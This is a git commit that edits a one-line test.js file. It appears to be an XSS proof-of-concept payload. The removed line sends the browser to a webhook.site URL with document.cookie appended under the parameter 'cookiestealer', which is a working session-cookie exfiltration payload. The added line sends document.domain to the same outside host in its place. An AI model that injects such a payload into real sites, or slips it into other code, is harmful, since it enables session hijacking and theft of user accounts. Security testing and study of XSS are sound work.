0183e8dec05e78d388b2b751e18c964497636d3c
mr7s3d0 <84435418+mr7s3d0@users.noreply.github.com>
2025-06-09 23:22:54 +0700

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-document.location='https://webhook.site/9381818e-cd98-4636-a7d4-a8f79c839b55/?cookiestealer='+document.cookie;
+document.location='https://webhook.site/9381818e-cd98-4636-a7d4-a8f79c839b55/?cookiestealer='+document.domain;
